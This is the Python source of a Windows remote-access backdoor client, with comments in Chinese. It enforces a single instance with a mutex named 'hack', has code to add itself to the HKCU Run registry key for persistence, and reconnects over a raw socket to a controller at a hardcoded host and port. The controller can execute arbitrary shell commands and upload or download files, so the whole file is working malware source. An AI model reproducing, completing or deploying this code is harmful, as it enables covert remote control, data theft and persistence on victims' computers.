import socket
import os,sys
import time
import win32api,win32event,pywintypes
import win32con,winreg,os
import subprocess
from json import *
import threading
from tkinter import *
from winerror import ERROR_ALREADY_EXISTS
mutexname = "hack"
mutex = win32event.CreateMutex(None, FALSE, mutexname)
if (win32api.GetLastError() == ERROR_ALREADY_EXISTS):
    exit(0)
host='127.0.0.1'
port=6666
def AutoRun(zdynames=None,
            current_file=None,
            abspath = os.path.abspath(os.path.dirname(__file__))):
    BASE_DIR = os.path.dirname(os.path.abspath(__file__))
    path = sys.argv[0]   #获取当前文件绝对路径

    # 注册表项名
    KeyName = r'Software\Microsoft\Windows\CurrentVersion\Run'
    key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER, KeyName, 0, win32con.KEY_ALL_ACCESS)
    try:
                win32api.RegSetValueEx(key, current_file, 0, win32con.REG_SZ, path)
                win32api.RegCloseKey(key)
    except:
        message="开启自启动设置失败"
        s.send(dumps({'id':id,'msg':message,'op':'cmd_rv'}).encode('utf-8'))

def super_pop(arg):
    p=subprocess.Popen(arg,shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    return p
def cmd(msg,s):
    if msg[0:2] == 'cd':
        temp = msg.split()
        try:
            os.chdir(temp[1])
            s.sendall(dumps({'id':id,'op':'cmd_rv','msg':os.getcwd()}).encode('utf-8'))
        except:
            message="switch to childfolder failde"
            s.sendall(dumps({'id':id,'op':'cmd_rv','msg':message}).encode('utf-8'))
    p = super_pop(msg)
    p = p.stdout.read().decode('gbk') + p.stderr.read().decode('gbk')
    data = p
    length=len(data.encode('utf-8'))
    s.sendall(dumps({'id': id, 'msg': length,'op':'cmd_size'}).encode('utf-8'))
    time.sleep(0.2)
    s.sendall(data.encode('utf-8'))
def get(msg,s):
    file_dir=os.getcwd()
    if os.path.isfile(msg):
        size=os.stat(msg).st_size
        message=msg+"|"+str(size)
        s.send(dumps({'id':id,'op':'get_rv','msg':message}).encode('utf-8'))
        f=open(msg,'rb')
        has_send=0
        while has_send!=size:
            file=f.read(1024)
            s.sendall(file)
            has_send+=len(file)
        f.close()
    else:
        message='文件不存在'
        s.send(dumps({'id':id,'op':'cmd_rv','msg':message}).encode('utf-8'))
def put(msg,s):
    if not os.path.isdir('receive'):
        os.mkdir('receive')
    os.chdir('receive')
    name,size=msg.split('|')
    f = open(name, 'ab')
    now=0
    while now != size:
        data = s.recv(1024)
        f.write(data)
        now += len(data)
    print('接收完毕')
    f.close()

def termin():
    s=reconnect()
    temp=sys.argv[0]
    while True:
        try:
           t=s.recv(1024)
           obj=loads(t.decode('utf-8'))
           msg=obj['msg']
           op=obj['op']
           if op=='cmd':
               cmd(msg,s)
           if op=='get':
               get(msg,s)
           if op=='put':
               put(msg,s)
        except(socket.error):
            s=reconnect()

def reconnect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
      try:
         s.connect((host,port))
         sl = '1'
         s.send(dumps({'id': id, 'msg': sl,'op':'cmd'}).encode('utf-8'))
         break
      except:
          time.sleep(3)
    return s

#win32api.MessageBox(0, "开始运行！", "提醒",win32con.MB_OK)
if __name__=='__main__':
    id = '1'
    termin()

